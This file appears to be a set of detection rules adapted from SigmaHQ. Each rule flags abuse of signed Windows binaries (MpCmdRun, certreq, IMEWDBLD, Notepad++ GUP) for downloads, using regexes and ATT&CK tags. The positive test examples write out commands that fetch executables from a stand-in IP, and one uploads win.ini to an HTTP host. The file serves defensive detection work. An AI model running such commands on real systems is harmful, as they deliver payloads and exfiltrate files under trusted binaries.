- id: mention.lolbin_mpcmdrun_downloadfile
  title: MpCmdRun -DownloadFile -url text
  match:
    anchored: 'MpCmdRun(?:\.exe)?["'']? [^\n]{0,60}-DownloadFile [^\n]{0,60}-url {1,3}["'']?(?:https?|ftp)://'
  case_sensitive: false
  strength: strong
  attack: [T1105, T1218]
  telemetry: [any]
  source:
    name: 'SigmaHQ: File Download Via Windows Defender MpCmpRun.EXE (Matthew Matchen)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_mpcmdrun_download_arbitrary_file.yml
    license: DRL-1.1
    upstream_id: 46123129-1024-423e-9fae-43af4a0fa9a5
  rationale: >-
    Defender's command-line utility fetching an arbitrary URL to a path (LOLBAS MpCmdRun) is a signed download
    channel; signature updates use -SignatureUpdate, not -DownloadFile. The rule rates false positives as unknown.
  examples:
    positive:
      - 'MpCmdRun.exe -DownloadFile -url http://203.0.113.7/a.exe -path C:\Users\Public\a.exe'
    negative:
      - '"C:\Program Files\Windows Defender\MpCmdRun.exe" -SignatureUpdate -MMPC'
      - '"C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 1'

- id: mention.lolbin_certreq_post_url
  title: certreq -Post -config text with a URL
  match:
    anchored: 'certreq(?:\.exe)?["'']? [^\n]{0,40}[-/]Post [^\n]{0,40}[-/]config {1,3}["'']?(?:https?|ftp)://'
  case_sensitive: false
  strength: strong
  attack: [T1105, T1048]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Suspicious CertReq Command to Download (Christian Burkard, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_certreq_download.yml
    license: DRL-1.1
    upstream_id: 4480827a-9799-4232-b2c4-ccc6c4e9e12b
  rationale: >-
    certreq posting a file to an HTTP 'config' target and saving the response (LOLBAS CertReq) uploads and downloads
    files under a signed binary. Enrollment uses a CA config string, not an http URL; the rule rates false positives
    as unlikely.
  examples:
    positive:
      - 'CertReq -Post -config http://203.0.113.7/ C:\Windows\win.ini C:\Users\Public\out.txt'
    negative:
      - 'certreq -submit -config "ca01.corp.example.org\CORP-CA" req.csr cert.cer'
      - 'certreq -new request.inf request.req'

- id: mention.lolbin_imewdbld_url
  title: IMEWDBLD.exe text with a URL argument
  match:
    anchored: 'IMEWDBLD(?:\.exe)?["'']? {1,3}["'']?(?:https?|ftp)://'
  case_sensitive: false
  strength: strong
  attack: [T1105, T1218]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Network Connection Initiated By IMEWDBLD.EXE (frack113)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/network_connection/net_connection_win_imewdbld.yml
    license: DRL-1.1
    upstream_id: 8d7e392e-9b28-49e1-831d-5949c6281228
  rationale: >-
    The IME dictionary builder caches whatever URL it is given; the rule flags any network connection it makes. The
    command-line form with a URL is the download abuse; the binary has no administrative command-line use.
  examples:
    positive:
      - 'C:\Windows\System32\IME\SHARED\IMEWDBLD.exe http://203.0.113.7/a.exe'
    negative:
      - 'Nov 21 10:02:00 ws01 MsiInstaller: Product: Microsoft Japanese IME -- Configuration completed successfully.'
      - 'C:\Windows\System32\IME\SHARED\IMEWDBLD.exe'

- id: mention.lolbin_gup_unzipto_url
  title: Notepad++ GUP -unzipTo text with a URL
  match:
    anchored: 'GUP\.exe["'']? [^\n]{0,40}-unzipTo [^\n]{0,200}(?:https?|ftp)://'
  case_sensitive: false
  strength: strong
  attack: [T1105, T1218]
  telemetry: [any]
  source:
    name: 'SigmaHQ: File Download Using Notepad++ GUP Utility (Nasreddine Bencherchali, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_gup_download.yml
    license: DRL-1.1
    upstream_id: 44143844-0631-49ab-97a0-96387d6b2d7c
  rationale: >-
    Notepad++'s updater told to fetch and unzip an arbitrary URL. The rule excludes runs launched by notepad++.exe;
    free text cannot see the parent, so an updater line that carries its own URL is the benign look-alike, which
    normally names the notepad-plus-plus.org update host.
  examples:
    positive:
      - 'GUP.exe -unzipTo "" "C:\Users\Public" "x http://203.0.113.7/a.zip 0123456789abcdef"'
    negative:
      - '"C:\Program Files\Notepad++\updater\GUP.exe" -v8.6.9'
      - '"C:\Program Files\Notepad++\updater\GUP.exe" -options'

